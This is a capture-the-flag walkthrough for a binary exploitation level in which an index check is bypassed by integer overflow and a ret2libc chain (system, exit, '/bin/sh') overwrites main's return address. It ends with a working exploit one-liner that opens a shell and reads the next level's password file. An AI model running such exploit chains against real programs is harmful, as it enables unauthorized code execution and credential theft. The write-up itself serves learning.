## LEVEL 07
---
### For a better understanding of the levels and the solutions, I recommend you to read the [disassemble file](./asm/level07.asm) and the [source file](./src/level07.c). This README only contains the most important parts to solve the level.
---
### Security
```
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   Canary found      NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level07/level07
```
This level has a stack canay. But the NX is disabled so we can execute shellcode. 
---

I recommend that you read the entire source code to understand the rest of my explanation in this README.

At first glance, we don't see any vulnerabilities that were present in the previous levels. And that's because the vulnerabilities don't come from the functions themselves; the real vulnerability lies within the program itself. After looking for a few minutes, I noticed this strange line:

```c
if (local__c % 3 == 0 || local__10 >> 0x18 == 0xb7)
```

`local__10` is the value set by the user, but why is it being compared with `0xb7`? We already know that 0xb7 is the beginning of the address from the stack. So I suppose that we can use this variable for something useful. But how?



```c
buf[local__c * 4] = local__10;
```

This line provides the answer. We can write a value at the address at `n` bytes from the beginning of the buffer. This buffer is inside the `main` function, which can be useful for overwriting the return address of `main`.

Perfect! If we want to overwrite the return address of `main`, we need to determine the distance between the pointer and the EIP (Instruction Pointer). We can do this with gdb.

```bash
(gdb) x/x $esp+0x24
0xffffd4e4:	0x00000000
(gdb) x/x $ebp+4
0xffffd6ac:	0xf7e45513

(gdb) p 0xffffd6ac - 0xffffd4e4
$2 = 456
(gdb) p 456 / 4
$3 = 114
```

Nice! So we need to write 114 bytes to overwrite the return address. But what address should we write?

This part seems to be the most challenging aspect of this level. Your first idea of writing a shellcode is not feasible due to limited space within the buffer. Additionally, writing the shellcode inside environment variables is not possible either because even if NX (No-Execute) is disabled, the program clears every `envp` (environment pointer) before the main while loop.

After a day of research on how to exploit this level, you found a solution called **ret2libc**.

Here is a quick explanation of what is ret2libc :

```
To fight the NX protection, a return-to-libc technique is used, which enables attackers to bypass the NX bit protection and subvert the vulnerable program's execution flow by re-using existing executable code from the standard C library shared object (/lib/i386-linux-gnu/libc-*.so), that is already loaded and mapped into the vulnerable program's virtual memory space, similarly like ntdll.dll is loaded to all Windows programs.

Source : https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/return-to-libc-ret2libc
```

Indeed, the technique of **ret2libc** is similar to the technique used in the previous levels. The main difference is that instead of using external code to launch a shell, we utilize an existing function from the libc. In order to successfully perform this technique, we need to overwrite three things:

1. The address of `system` function to overwrite the return value of main with it.
2. The address of `exit` function to overwrite the return value of system with it.
3. The address of `/bin/sh` string to overwrite the first argument of system with it.

To find the address of these functions and string, we can use gdb.

```bash
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
(gdb) p exit
$4 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
(gdb) find 0xf7e2c000, 0xf7fcc000, {char [7]}"/bin/sh"
0xf7f897ec
1 pattern found.
(gdb) x/s 0xf7f897ec
0xf7f897ec:	 "/bin/sh"
```

Perfect! Now we need to determine where to place these addresses in the stack. But first, let's understand what will happen in the stack when the program calls the `system` function. Here's a simple example to explain it:

```
Before :

----------------- <- 0xff
|               |
|               |
|      ...      |
|---------------|
| arg of main   | <- 0xf8
|---------------|
| return ptr    | <- 0xf4
|---------------|
| old ebp ptr   | <- 0xf0
|---------------|
|               |
|               |
|     data      |
|               | <- 0xe0
|---------------|

Now we overwrite the return ptr with system and return :

EIP = system addr
----------------- <- 0xff
|               |
|               |
|      ...      |
|---------------|
| arg of main   | <- 0xf8
|---------------|
|               |
|     free      |
|               |
|               |
|               |
|               |
|               |
|               | <- 0xe0
|---------------|

Now the program call system :

----------------- <- 0xff
|               |
|---------------|
| arg of system |
|---------------|
| return ptr    | <- 0xf8
|---------------|
|               |
|               |
|               |
|     data      |
|               |
|               |
|               |
|               | <- 0xe0
|---------------|
```

As we can see, the `system` function will take the old `main` argument as the return address. This is because in normal usage, the last value on the stack before running a function should be the address to the parent function. Now that we understand this, we know where to place our addresses in the stack.

```
system -> $ebp + 4
exit   -> $ebp + 8
/bin/sh -> $ebp + 12
```

Before to go further, I convert these three addresses in decimal.
```
system -> 0xf7e6aed0 = 4159090384
exit   -> 0xf7e5eb70 = 4159040368
/bin/sh -> 0xf7f897ec = 4160264172
```

Now we can try to overwrite our addresses :
```bash
Input command: store
 Number: 4159090384
 Index: 114
 *** ERROR! ***
   This index is reserved for wil!
 *** ERROR! ***
 Failed to do store command
```
Oh, we already have a problem. Why ?

The reason is simple here is the code :
```c
if (local__c % 3 == 0 || local__10 >> 0x18 == 0xb7)
```

As we can see, the program check if the value is a multiple of 3.
So I have to find a technique to write this value. Maybe using a int overflow ?
```c
buf[local__c * 4] = local__10;
```

We can see here that the buffer index is multiplied by 4. So we may find a value that when it's multiplied by 4, it not a multiple of 3.

First I divide the UINT_MAX by for to overflow it.
> 4294967295 / 4 = 1073741823.75

Now I add 114 to this value to reach the return address. I don't divide this value by 4 because I already divided it before.
> 1073741823 + 114 = 1073741937.75

And finally I around this value to the nearest integer.
> 1073741938

Perfect, we can try again :

```bash
Input command: store
 Number: 4159090384
 Index: 1073741938
 Completed store command successfully

Breakpoint 1, 0x0804887f in main ()
(gdb) x/x $ebp+4
0xffffd6ac:	0xf7e6aed0
```

Nice, this is exactly what we wanted. Now we can copy the other values outside of GDB to launch a shell.

```bash
$ (python -c 'print "store"; print "4159090384"; print "1073741938"; print "store"; print "4159040368"; print "115"; print "store"; print "4160264172"; print "116"; print "quit"'; cat -) | ./level07
----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
whoami
level08
cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```
